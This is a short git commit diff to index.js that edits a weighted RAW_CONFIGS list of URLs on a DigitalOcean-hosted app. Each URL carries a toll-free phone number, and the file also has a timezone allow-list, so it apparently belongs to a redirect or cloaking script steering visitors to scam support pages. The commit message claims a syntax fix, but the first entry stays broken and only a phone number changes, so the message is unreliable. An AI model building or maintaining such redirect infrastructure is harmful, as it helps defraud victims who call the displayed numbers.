730aeb8b9dc55d85cc5e9e2165e19e755a9f0329
paalakash <palaksh452@gmail.com>
2026-06-03 05:10:30 +0530

    Fix syntax error in RAW_CONFIGS array

--- index.js
+++ index.js
@@ -32,7 +32,7 @@ const ALLOWED_TIMEZONES = new Set([
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
     { url: "https://seahorse-app-upc54.ondigitalocean.app/werrx01USAHTML/?bcda=1800 209 169", weight: 0.5,
-    { url: "https://seahorse-app-upc54.ondigitalocean.app/werrx01USAHTML/?bcda=1800 209 169", weight: 0.5 }
+    { url: "https://seahorse-app-upc54.ondigitalocean.app/werrx01USAHTML/?bcda=1800-900-934", weight: 0.5 }
 
 ];
 
